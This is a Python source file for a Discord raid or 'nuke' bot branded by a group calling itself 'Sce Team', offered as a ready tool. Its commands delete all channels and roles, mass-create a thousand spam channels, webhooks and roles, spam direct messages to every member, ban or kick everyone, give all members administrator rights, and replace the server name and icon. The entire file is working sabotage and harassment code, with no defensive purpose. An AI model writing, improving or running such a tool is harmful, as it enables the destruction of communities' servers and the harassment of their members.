import discord
from discord.ext import commands, tasks
from colorama import Fore, Style
import asyncio
import random
import time

intents = discord.Intents.all()
intents.members = True
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

title = "[Sce Nuke Bot Raid V1] (beta !!)"
options = [
    "Nuke",
    "Spam-role",
    "Spam-webhooks",
    "Spam-dm",
    "Spam",
    "delete-role",
    "delete-channel",
    "delete-webhooks",
    "Renameall",
    "Adminall",
    "Banall",
    "Kickall"
]

discord_option = "https://discord.gg/924ycm7jr6"

status = [
    "Sce Team"
]

anti_join_enabled = False

OWNER_ID = input("Enter the owner's ID: ")
TOKEN = input("Enter your bot token: ")

channel_names = input("Enter a channel name for spam: ")
message_options = input("Enter a spam message: ")

def print_menu(title, options):
    print(f"{Fore.RED}{title}{Style.RESET_ALL}\n")
    for i, option in enumerate(options, start=1):
        print(f"{Fore.BLUE}[{i}] - {Style.RESET_ALL}{option}")

def print_discord(discord_option):
    print("\n")
    print(f"{Fore.BLUE}[0] - {Style.RESET_ALL}{Fore.WHITE}{discord_option}{Style.RESET_ALL}")

print('\033[34m' + 'SCE TEAM ON TOP' + '\033[0m')

loading_message = "\033[92mConnecting...\033[0m"
print(loading_message, end='', flush=True)
time.sleep(1.8)
print("\r\033[92mConnected successfully!\033[0m", end='', flush=True)
time.sleep(1)
print("\r" + " " * len(loading_message))

print_menu(title, options)
print_discord(discord_option)

@tasks.loop(seconds=6)
async def change_presence():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.streaming, name=random.choice(status), url="https://www.twitch.tv/v"))

@bot.event
async def on_ready():
    change_presence.start()
    print("Bot is ready")

@bot.event
async def on_error(event, *args, **kwargs):
    print('---------------------')
    print(f'Error in event: {event}')
    print(f'Error: {args[0]}')
    print('---------------------/////')

@bot.event
async def on_member_join(member):
    global anti_join_enabled
    if anti_join_enabled:
        if member.bot:
            if member.guild.me.guild_permissions.kick_members:
                await member.kick(reason="Anti-join: Bots are not allowed.")
                print(f"\033[93mBot {member.name} kicked for attempting to join.\033[0m")
            else:
                print("\033[91m[Error]\033[0m Missing permissions to kick bots.")
        else:
            await member.kick(reason="Anti-join: New members are not allowed.")
            print(f"\033[93mMember {member.name} kicked for attempting to join.\033[0m")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f"\033[91m[Error]\033[0m Command not found. Use .raid for available commands.")
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"\033[91m[Error]\033[0m Missing required argument.")
    elif isinstance(error, commands.CommandInvokeError):
        print(f"\033[91m[Error]\033[0m An error occurred while executing the command.")
    elif isinstance(error, commands.BotMissingPermissions):
        print(f"\033[91m[Error]\033[0m Bot lacks necessary permissions.")
    elif isinstance(error, commands.MissingPermissions):
        print(f"\033[91m[Error]\033[0m You lack necessary permissions.")
    else:
        print(f"\033[91m[Error]\033[0m An error occurred: {error}")

@bot.command(name='raid')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def raid(ctx):
    print(f"Command 'raid' executed by: {ctx.author.name}.")
    await ctx.send(
        "$$ __**Sce Nuke Tool - Raid**__ $$\n"
        ".nuke -> Delete all channels + spam channels\n"
        ".spam-role -> Spam roles with random names\n"
        ".spam-webhooks -> Spam messages with webhooks in all channels\n"
        ".spamdm -> Send direct messages to all server members\n"
        ".spam -> Spam messages in all text channels\n"
        ".delete-role -> Delete all roles (except default)\n"
        ".delete-channel -> Delete all channels\n"
        ".delete-webhooks -> Delete all webhooks\n"
        ".adminall -> Create an admin role and assign it to all members\n"
        ".banall -> Ban all members except the owner\n"
        ".renameall -> Rename all members\n"
        ".kickall -> Kick all members except the owner\n"
        ".anti-join -> Prevent new members from joining (beta)\n"
        "SCE TEAM ON TOP\n"
    )

@bot.command(name='nuke')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def create_and_delete_channels(ctx):
    print("\033[91mStarting nuke...\033[0m")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mChannel {channel.name} deleted.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting channel {channel.name}: {e}\033[0m")
    print("\033[92mAll channels deleted.\033[0m")
    async def create_channel_and_spam(channel_name):
        new_channel = await ctx.guild.create_text_channel(channel_name)
        await asyncio.gather(*[new_channel.send(random.choice(message_options)) for _ in range(50)])
        await asyncio.sleep(1)
    tasks = [create_channel_and_spam(f'{random.choice(channel_names)}-{i}') for i in range(1000)]
    await asyncio.gather(*tasks)
    print("\033[92mNew channels created and messages sent.\033[0m")
    try:
        await ctx.guild.edit(name="server")
        print("\033[92mServer name changed.\033[0m")
    except Exception as e:
        print(f"\033[91mError changing server name: {e}\033[0m")
    try:
        url = 'https://cdn.discordapp.com/avatars/1242188826877890620/665296b9eac933c22043c42bf46981fb?size=256.png'
        async with bot.session.get(url) as resp:
            if resp.status != 200:
                raise Exception("Failed to download image")
            data = await resp.read()
            await ctx.guild.edit(icon=data)
        print("\033[92mServer icon changed.\033[0m")
    except Exception as e:
        print(f"\033[91mError changing server icon: {e}\033[0m")

@bot.command(name='adminall')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def give_admin(ctx):
    admin_role_name = "ADMIN"
    admin_role = discord.utils.get(ctx.guild.roles, name=admin_role_name)
    if admin_role is None:
        try:
            admin_role = await ctx.guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
            print(f"Role {admin_role_name} created.")
        except Exception as e:
            await ctx.send(f"Error creating role {admin_role_name}: {e}")
            return
    print(f"Command adminall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        try:
            if admin_role not in member.roles:
                await member.add_roles(admin_role)
                print(f"Role {admin_role_name} added to {member.name}.")
        except Exception as e:
            print(f"Error adding role {admin_role_name} to {member.name}: {e}")
    await ctx.send(f"Role {admin_role_name} added to all members.")

@bot.command(name='banall')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def ban_all(ctx):
    print(f"Command banall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        if member.id != OWNER_ID:
            try:
                await member.ban(reason="Banned due to raid association.")
                print(f"\033[92mMember {member.name} banned successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError banning member {member.name}: {e}\033[0m")

@bot.command(name='kickall')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def kick_all(ctx):
    print(f"Command kickall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        if member.id != OWNER_ID:
            try:
                await member.kick(reason="Kicked due to raid association.")
                print(f"\033[92mMember {member.name} kicked successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError kicking member {member.name}: {e}\033[0m")

@bot.command(name='renameall')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def rename_all(ctx, *, name):
    print(f"Command renameall executed by {ctx.author.name}")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=name)
            print(f"\033[92mMember {member.name} renamed successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError renaming member {member.name}: {e}\033[0m")

@bot.command(name='delete-webhooks')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def delete_webhooks(ctx):
    print(f"Command delete-webhooks executed by {ctx.author.name}")
    for channel in ctx.guild.channels:
        try:
            webhooks = await channel.webhooks()
            for webhook in webhooks:
                await webhook.delete()
                print(f"\033[92mWebhook {webhook.name} deleted successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting webhook: {e}\033[0m")

@bot.command(name='delete-channel')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def delete_channels(ctx):
    print(f"Command delete-channel executed by {ctx.author.name}")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"\033[92mChannel {channel.name} deleted successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError deleting channel {channel.name}: {e}\033[0m")

@bot.command(name='delete-role')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def delete_roles(ctx):
    print(f"Command delete-role executed by {ctx.author.name}")
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"\033[92mRole {role.name} deleted successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError deleting role {role.name}: {e}\033[0m")

@bot.command(name='spam-role')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def create_roles(ctx):
    print(f"Command spam-role executed by {ctx.author.name}")
    for _ in range(100):
        try:
            await ctx.guild.create_role(name=random.choice(message_options))
            print(f"\033[92mRole created successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError creating role: {e}\033[0m")

@bot.command(name='spam-webhooks')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def create_webhooks(ctx):
    print(f"Command spam-webhooks executed by {ctx.author.name}")
    for _ in range(100):
        for channel in ctx.guild.channels:
            try:
                await channel.create_webhook(name=random.choice(message_options))
                print(f"\033[92mWebhook created in {channel.name} successfully.\033[0m")
            except Exception as e:
                print(f"\033[91mError creating webhook in {channel.name}: {e}\033[0m")

@bot.command(name='spamdm')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def spam_dm(ctx, *, message):
    print(f"Command spamdm executed by {ctx.author.name}")
    if not message:
        await ctx.send("You must specify a message.")
        return
    for member in ctx.guild.members:
        try:
            await member.send(message)
            print(f"\033[92mMessage sent to {member.name} successfully.\033[0m")
        except Exception as e:
            print(f"\033[91mError sending message to {member.name}: {e}\033[0m")

@bot.command(name='anti-join')
@commands.check(lambda ctx: ctx.author.id == OWNER_ID)
async def toggle_anti_join(ctx):
    global anti_join_enabled
    anti_join_enabled = not anti_join_enabled
    print(f"Anti-join {'enabled' if anti_join_enabled else 'disabled'} by {ctx.author.name}")

@bot.command(name='help')
async def help_command(ctx):
    embed = discord.Embed(title="Sce Nuke Tool - Help", description="Available commands:", color=0x00ff00)
    embed.add_field(name=".raid", value="Show raid options.", inline=False)
    embed.add_field(name=".nuke", value="Delete all channels and spam new ones.", inline=False)
    embed.add_field(name=".adminall", value="Give admin role to all members.", inline=False)
    embed.add_field(name=".banall", value="Ban all members except the owner.", inline=False)
    embed.add_field(name=".kickall", value="Kick all members except the owner.", inline=False)
    embed.add_field(name=".renameall [name]", value="Rename all members.", inline=False)
    embed.add_field(name=".delete-webhooks", value="Delete all webhooks.", inline=False)
    embed.add_field(name=".delete-channel", value="Delete all channels.", inline=False)
    embed.add_field(name=".delete-role", value="Delete all roles except default.", inline=False)
    embed.add_field(name=".spam-role", value="Spam roles with random names.", inline=False)
    embed.add_field(name=".spam-webhooks", value="Spam webhooks in all channels.", inline=False)
    embed.add_field(name=".spamdm [message]", value="Send direct messages to all members.", inline=False)
    embed.add_field(name=".anti-join", value="Toggle anti-join mode.", inline=False)
    embed.add_field(name=".help", value="Show this help.", inline=False)
    await ctx.send(embed=embed)

bot.run(TOKEN)
